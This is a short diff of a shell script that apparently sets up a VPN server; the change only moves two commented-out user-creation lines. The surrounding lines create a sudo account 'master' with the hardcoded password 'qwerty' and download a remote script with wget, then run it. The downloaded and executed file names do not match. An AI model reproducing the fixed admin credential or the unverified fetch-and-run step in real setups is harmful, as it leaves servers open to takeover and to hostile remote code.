@@ -27,14 +27,14 @@ mkdir -p /root/myvpn/cron
 grep "/bin/false" /etc/shells || echo "/bin/false" >> /etc/shells
 grep "/bin/nologin" /etc/shells || echo "/usr/sbin/nologin" >> /etc/shells
 
+##useradd -s /bin/false -M el
+##echo -e "satu\nsatu\n" | passwd el &> /dev/null
+
 Login="master"
 Pass="qwerty"
 useradd -m -s /bin/bash $Login
 echo -e "$Pass\n$Pass\n" | passwd $Login &> /dev/null
 usermod -aG sudo $Login
-
-##useradd -s /bin/false -M el
-##echo -e "satu\nsatu\n" | passwd el &> /dev/null
 
 #ADD Extra Ram Swap 2GB
 wget $site/tools/setup-rameswap.sh && bash setup-ramswap.sh
